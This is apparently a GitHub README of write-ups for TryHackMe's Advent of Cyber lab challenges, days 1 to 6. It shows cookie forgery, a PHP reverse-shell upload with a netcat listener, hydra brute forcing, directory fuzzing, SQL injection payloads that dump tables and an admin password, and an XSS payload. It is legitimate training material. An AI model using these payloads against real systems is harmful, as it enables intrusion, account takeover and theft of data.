# Try Hack Me Advent of Cyber

This repo contains a collection of bad writeups and bad solve scripts.  

Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christmas)

## Checklist

- [x] [Day 1 - A Christmas Crisis](#day-1-a-christmas-crisis)
- [x] [Day 2 - The Elf Strikes Back](#day-2-the-elf-strikes-back)
- [x] [Day 3 - Christmas Chaos](#day-3-christmas-chaos)
- [x] [Day 4 - Santa's watching](#day-4-santas-watching)
- [x] [Day 5 - Someone stole Santa's gift list!](#day-5-someone-stole-santas-gift-list)
- [x] [Day 6 - Be careful with what you wish on a Christmas night](#day-6-be-careful-with-what-you-wish-on-a-christmas-night)
- [ ] Day 7 - The Grinch Really Did Steal Christmas
- [ ] Day 8 - What's Under the Christmas Tree?
- [ ] Day 9 - Anyone can be Santa!
- [ ] Day 10 - Don't be Elfish!
- [ ] Day 11 - The Rogue Gnome
- [ ] Day 12 - Ready, set, elf.
- [ ] Day 13 - Coal for Christmas
- [ ] Day 14 - Where's Rudolph?
- [ ] Day 15 - There's a Python in my stocking!
- [ ] Day 16 - Help! Where is Santa?
- [ ] Day 17 - ReverseELFneering
- [ ] Day 18 - The Bits of the Christmas
- [ ] Day 19 - The Naughty or Nice List
- [ ] Day 20 - PowershELlF to the rescue
- [ ] Day 21 - Time for some ELForensics
- [ ] Day 22 - Elf McEager becomes CyberElf
- [ ] Day 23 - The Grinch strikes again!
- [ ] Day 24 - The Trial Before Christmas

## Day 1: A Christmas Crisis

*Category: Web Exploitation*  
*Tags: HTTP, Cookies*  

> Understand how the web works and take back control of the Christmas Command Centre!

IP: `10.10.161.100`

### Basic enumeration

Firstly, I checked out the web server running on port 80 (HTTP).

![screenshot](day01-christmas-crisis/ChristmasControlCenterLogin.png)

I register for an account using the credentials `admin:bluemoon` and then log in with those credentials.

![screenshot](day01-christmas-crisis/ChirstmasControlCenterControlPanel.png)

### What is the name of the the cookie used for authentication?

The name of the authentication cookie is: `auth`.

### What format is the value of this cookie encoded and what format is the data stored in?

The value of the auth cookie is: `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2261646d696e227d`.  

Putting the entire thing into [CyberChef](https://gchq.github.io/CyberChef/), we find that it is using `hexadecimal` to encode the string: `{"company":"The Best Festival Company", "username":"admin"}`.  

The data is stored in `JSON` format.  

### Bypassing the authentication

We can encode `{"company":"The Best Festival Company", "username":"santa"}` into hexadecimal to find the value of santa's authentication token.  

Value of the santa cookie: `7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d`.  

After setting the auth cookie to that string, we get access to the santa account and full control panel access.

### Getting the flag

I'm not sure why but I got a bit stuck here. Turns out, you just flick all the switches and you get the final flag.

Flag: `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}`

### Making a [solve script](day01-christmas-crisis/solve.sh)

I noticed that the program sends a post request to `http://10.10.161.100/api/checkflag`. I noticed it also sent the cookie along with it. Therefore, I decided to send a POST request to the URL with the cookie and lo and behold, the flag! Here, I did it using curl in bash:  
```bash
curl -X POST -H "Cookie: auth=7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d" http://10.10.161.100/api/checkflag;
```
I have also included the shell script I wrote in the day01-christmas-crisis directory. 

## Day 2: The Elf Strikes Back

*Category: Web*  
*Tags: RCE*  

> Learn about basic file upload filter bypasses by performing a security audit on the new security management server!

IP: `10.10.119.58`

### Basic enumeration

Firstly, I checked the HTTP server running on port 80.

![screenshot](day02-elf-strikes-back/initial_page.png)

### What string of text needs added to the URL to get access to the upload page?

We can use the id given to us (`ODIzODI5MTNiYmYw`) to find an upload page at `http://10.10.119.58/?id=ODIzODI5MTNiYmYw`.

![screenshot](day02-elf-strikes-back/initial_page_id.png)

### What type of file is accepted by the site?

If we examine the source code, we find the following the the HTML code:
```HTML
<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">
```
It turns out that this page only accepts image files.

### In which directory are the uploaded files stored?

After poking around in the address bar, I found that the uploads are kept in the `/uploads/` directory.  

We can find the uploaded files at `http://10.10.119.58/uploads/`.

### Getting a shell

Firstly, I wanted to find out what was running the web server. Therefore, I opened the network tab and reloaded the page to get the response headers.

![screenshot](day02-elf-strikes-back/network_tab.png)

We see that the server is running Apache 2.4.37 on CentOS powered by PHP. Therefore, I got a PHP reverse shell script from [Pentest Monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).  

Be sure to change the following lines in the PHP file:
```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

Then, I renamed the file to `php-reverse-shell.jpg.php` to circumvent the checks and uploaded the file.

**Establishing the reverse shell connection**

Since I set the PHP reverse shell to connect on port 4444, I set up a netcat listener on that port.

```sh
nc -lvnp 4444
```

Finally, I visited the following URL `http://10.10.119.58/uploads/` to run the PHP script.  

I was then greated by this beautiful message:

```
Listening on 0.0.0.0 4444
Connection received on 10.10.119.58 54002
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:25:23 up 41 min,  0 users,  load average: 0.00, 0.00, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: cannot set terminal process group (823): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$
```

Bingo! Now that we have a reverse shell, what next?

### What is the flag in /var/www/flag.txt?

First, I made sure I was successfully connected to the server:

```
sh-4.4$ whoami
whoami
apache
sh-4.4$ pwd
pwd
/
```

Now that we have a shell, we can read the flag:

```
sh-4.4$ cat /var/www/flag.txt
cat /var/www/flag.txt


==============================================================


You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 


Have a flag -- you deserve it!
THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}


Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
 --Muiri (@MuirlandOracle)


==============================================================
```

And so with that, we get a nice message and the flag.

Flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`

## Day 3: Christmas Chaos

*Category: Web Exploitation*  
*Tags: Authentication Bypass*  

> Hack the hackers and bypass a login page to gain admin privileges.

IP: `10.10.88.75`

### Basic Enumeration

As always, we check out the webpage running on port 80 first.

![screenshot](day03-christmas-chaos/initial_page.png)

### Brute force attack

As suggested by the lesson on TryHackMe, we can use a dictionary attack to break the authentication and gain unauthorized access.  

First, I created the username and password wordlist using the dictionary provided ([username dictionary](day03-christmas-chaos/usernames.txt) and [password dictionary](day03-christmas-chaos/passwords.txt)).

Next, I monitored the network traffic in Firefox to see how the login request is being sent. Unsurprisingly, this web app sends a post request with the form data.

![screenshot](day03-christmas-chaos/network_tab.png)

Then I used the following `hydra` command to find the username and password. `-L` is used to specify the username dictionary, `-P` is used to specify the password dictionary, http-post-form and the string is used to specify how to send the login request. `^USER^` and `^PASS^` are replaced by the username or password from the wordlist respectively. `incorrect` at the very end it is part error message when we use the wrong username password combo.

```sh
hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
```

And sure enough, we find the username and password:

```
[80][http-post-form] host: 10.10.88.75   login: admin   password: 12345
```

Now that we have credentials, we can log in and get the flag!

![screenshot](day03-christmas-chaos/flag.png)

Flag: `THM{885ffab980e049847516f9d8fe99ad1a}`

## Day 4: Santa's watching

*Category: Web Exploitation*  
*Tags: Authorization Bypass*  

> Exploit Santa's login form and obtain admin credentials to save Santa's nice list!

IP: `10.10.252.228`

Assets:
- Wordlist for Gobuster ([danielmiessler/SecLists/Discovery/Web-Content/big.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt))
- Wordlist for wfuzz ([available for download](https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist)) (also in the day04-santas-watching directory)

### Given the URL `http://shibes.xyz/api.php`, what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)

`wfuzz -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`

### Basic Enumeration

By know, you probably know the drill. Step 1: visit the website running on port 80.

![screenshot](day04-santas-watching/nothing.png)

Huh, there seems to be not much of interest on the page or in the source code for the page.

### Finding the API directory using Gobuster

We can use gobuster to find hidden directories:

```sh
gobuster -u http://10.10.252.228/ -w day04-santas-watching/big.txt -x php,txt,html
```

And we find the following:

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.252.228/
[+] Threads      : 10
[+] Wordlist     : day04-santas-watching/big.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : html,php,txt
[+] Timeout      : 10s
=====================================================
2020/12/04 15:24:55 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htpasswd.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/LICENSE (Status: 200)
/api (Status: 301)
```

If we visit `http://10.10.252.228/api` we can find the empty `site-log.php` file.

### Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

We can use the following wfuzz command to fuzz the date get parameter:

```sh
wfuzz -c --hh 0 -z file,day04-santas-watching/wordlist http://10.10.252.228/api/site-log.php?date=FUZZ
```

After running the command, we get the following output:

```
Target: http://10.10.252.228/api/site-log.php?date=FUZZ
Total requests: 63

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                     
===================================================================

000000026:   200        0 L      1 W      13 Ch       "20201125"                                                                                                                                                  

Total time: 3.005774
Processed Requests: 63
Filtered Requests: 62
Requests/sec.: 20.95965
```

### Getting the flag

Now that we know where to find the flag, we can simply use cURL to actually get the flag:

```
curl http://10.10.252.228/api/site-log.php?date=20201125
```

Flag: `THM{D4t3_AP1}`

## Day 5: Someone stole Santa's gift list!

*Category: Web Exploitation*  
*Tags: SQL injection, PHP*  

> Learn to detect and exploit one of the most dangerous web vulnerabilities!

IP: `10.10.220.236`  
Port: `8000`

### Without using directory brute forcing, what's Santa's secret login panel?

Using the hint, we know that the panel is located at `/santapanel`

![screenshot](day05-someone-stole-santas-gift-list/panel_login.png)

### Bypass the login using SQL injection

Visiting `10.10.220.236:8000/santapanel`, we see there is a login page which I assumed to be vulnerable to SQLi. Therefore, I tried the following payload and sure enough, I was able to gain access to the santapanel

```
' OR 1==1;--
```

The full SQL command would then look something like this:

```sql
SELECT * FROM some_table WHERE username='' OR 1==1;-- AND password='';
```

As you can see, every entry in this tabble will be returned even if the username doesn't match since 1==1 always evaluates to true.

![screenshot](day05-someone-stole-santas-gift-list/panel_page.png)

### How many entries are there in the gift database?

We can supply a wildcard character (`%`) to select every entry into the database. If we count them, we see that we have 22 entries.

We also see that `Paul` asked for `github ownership`.

### Finding the flag

First we need to find the table names and their schema. We do so using the following SQLi payload to union the tbl_name and sql fields from the sqlite_master table:

```
%' UNION SELECT tbl_name, sql FROM sqlite_master;--
```
Which expands to the following:
```sql
SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT tbl_name, sql FROM sqlite_master;--;
```

We get the following result:

```
hidden_table | CREATE TABLE hidden_table (flag text)
sequels | CREATE TABLE sequels (title text, kid text, age integer)
users | CREATE TABLE users (username text, password text)
```

To get the flag, we can use the following SQLi payload

```
%' UNION SELECT 1, flag FROM hidden_table;--
```
Which expands to the following:
```sql
SELECT gift, child FROM some_table WHERE gift LIKE '%' UNION SELECT 1, flag FROM hidden_table;--;
```

Then we find the flag in the table.

Flag: `thmfox{All_I_Want_for_Christmas_Is_You}`

### Getting the admin password

Once again, we use a SQLi payload.

```
%' UNION SELECT username, password FROM users;--
```

In the table we can find the admin's password.

```
admin:EhCNSWzzFP6sc7gB
```

## Day 6: Be careful with what you wish on a Christmas night

*Category: Web Exploitation*  
*Tags: JavaScript*  

> Get familiar with compromising user interactions with vulnerable applications by executing custom javascript code.

IP: `10.10.157.100`  
Port: `5000`

### Finding the cross-site scripting

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/make_a_wish.png)

#### Stored cross-site scripting

Found in the `enter a wish here` box.

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/stored_xss.png)

#### Reflected cross-site scripting

Found in the `search query` box.

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/reflected_xss.png)

#### How to exploit?

Type the following payload into either of them to see a cross-site scripting pop-up:

```html
<script>alert("XSS");</script>
```

### Getting the flag

Well unfortunately, there is no flag for this challenge. So here's a fake flag that I made!

![screenshot](day06-be-careful-with-what-you-wish-for-on-a-christmas-night/fake_flag.png)